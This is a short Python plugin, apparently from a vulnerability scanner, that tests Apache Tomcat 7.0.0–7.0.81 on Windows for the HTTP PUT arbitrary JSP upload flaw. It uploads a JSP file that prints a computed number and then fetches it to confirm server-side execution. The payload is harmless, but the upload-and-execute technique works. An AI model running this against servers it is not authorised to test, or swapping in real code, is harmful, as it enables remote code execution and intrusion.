# -*-* coding:UTF-8


class Plugin(Base):
    __info__ = {
        "name": "Tomcat任意写入文件漏洞",
        "version": "Apache Tomcat 7.0.0 - 7.0.81",
        "description": "当 Tomcat 运行在 Windows 主机上，且启用了 HTTP PUT 请求方法（例如，将 readonly 初始化参数由默认值设置为 false），攻击者将有可能可通过精心构造的攻击请求向服务器上传包含任意代码的 JSP 文件。之后，JSP 文件中的代码将能被服务器执行",
        "references": ["-"],
    }

    def url(self) -> dict:
        random_str = self.build_random_str(4)
        random_int = self.build_random_int(4)
        check_flag = str(random_int*4)
        path = f'./{random_str}.jsp/'
        self.request(method='PUT', path=path, timeout=15, data=f"<%out.println({random_int}*4);%>")
        r = self.request(method='GET', path=path, timeout=15,)
        if check_flag in r.text:
            return {"LoopholeInfo": self.__info__}
